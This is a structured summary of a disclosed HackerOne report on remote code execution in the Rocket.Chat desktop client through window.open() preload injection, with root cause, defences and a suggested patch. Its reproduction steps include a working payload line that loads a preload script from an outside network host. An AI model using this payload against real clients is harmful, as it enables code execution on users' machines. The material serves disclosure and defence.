# Remote Code Execution in Rocket.Chat-Desktop via Malicious Preload Script

## Metadata
- **Source:** HackerOne
- **Report:** 943725 | https://hackerone.com/reports/943725
- **Submitted:** 2020-07-27
- **Reporter:** sectex
- **Program:** Rocket.Chat
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Improper Input Validation, Electron Security Misconfiguration, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Rocket.Chat-Desktop versions prior to 3.0.0-develop are vulnerable to RCE through malicious preload script injection via window.open(). An attacker controlling a Rocket.Chat server can inject custom JavaScript that opens windows with arbitrary preload scripts and nodeIntegration enabled, achieving arbitrary code execution. The vulnerability exists in the window.open() wrapper function which fails to sanitize the features parameter containing preload paths.

## Attack scenario
1. Attacker gains administrative access to a Rocket.Chat server (or operates a malicious server)
2. Attacker navigates to Administration > Layout > Custom Scripts > Custom Script for Logged In Users
3. Attacker injects malicious JavaScript using window.open() with nodeIntegration=true and preload parameter pointing to attacker-controlled script
4. When a user connects the Rocket.Chat-Desktop client to the server, the custom script executes in the renderer process
5. The window.open() call creates a BrowserWindow with nodeIntegration enabled and loads the attacker's preload script from network location
6. The preload script executes with full Node.js access, allowing arbitrary code execution (e.g., spawning cmd.exe, accessing filesystem, stealing data)

## Root cause
The window.open() wrapper function in src/preload/jitsi.js does not properly sanitize user-supplied features parameter, particularly the preload attribute. Combined with nodeIntegration=true, this allows attackers to specify arbitrary preload scripts that execute with Node.js capabilities. The features string is directly passed from custom admin scripts without validation.

## Attacker mindset
An attacker controlling a Rocket.Chat server or performing server-side compromise can leverage administrative custom script functionality to inject malicious code. By using window.open() with carefully crafted features including preload paths and nodeIntegration, they bypass normal sandbox restrictions and achieve native code execution on victim machines. This is a privilege escalation from server-side injection to client-side RCE.

## Defensive takeaways
- Always sanitize and validate window.open() features parameter in Electron applications; disable or whitelist only safe features
- Default to nodeIntegration=false and use context isolation to prevent privilege escalation
- Implement strict Content Security Policy and sandboxing for dynamically loaded content
- Validate preload script paths against a whitelist of application directories; reject network paths
- Restrict administrative custom script functionality with input validation and escaping
- Use subprocess isolation for untrusted code execution rather than preload scripts
- Implement security headers and disable dangerous Electron APIs in renderer processes
- Audit all window creation code paths for similar parameter injection vulnerabilities

## Variant hunting
Search for similar patterns: (1) Other window.open() wrappers in preload scripts that don't sanitize features, (2) Custom admin script injection points in communication platforms, (3) Electron applications exposing window creation APIs to user-controlled input, (4) Other features parameters being passed through without validation (e.g., nodeIntegration, sandbox, preload, contextIsolation settings), (5) Web-to-native bridges that accept preload script paths from untrusted sources

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1548: Abuse Elevation Control Mechanism
- T1203: Exploitation for Client Execution
- T1559: Inter-Process Communication
- T1059: Command and Scripting Interpreter
- T1195: Supply Chain Compromise

## Notes
This vulnerability demonstrates a critical design flaw in Electron-based applications where administrative injection capabilities combined with unsafe window creation APIs lead to RCE. The fix is straightforward (clearing features parameter) but the root cause is architectural - allowing custom scripts to execute window.open() with Electron-specific parameters. The report includes a clear reproduction path and suggested mitigation code. The vulnerability affects all users of vulnerable Rocket.Chat-Desktop versions connecting to compromised or attacker-controlled servers.

## Full report
<details><summary>Expand</summary>

**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: < v3.0.0-develop

## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.

## Suggested mitigation

  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)
  ```
  const wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {
       const settings = getSettings();

       features = ''; // <- should fix it

       if (settings && url.parse(href).host === settings.get('Jitsi_Domain')) {
         features = [
           features,
           'nodeIntegration=true',
           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,
         ].join(',');
       }

       return defaultWindowOpen.call(window, href, frameName, features);
  };
  ```

## Impact

Remote Code Execution in Rocket.Chat-Desktop

</details>

---
*Analysed by Claude on 2026-05-12*
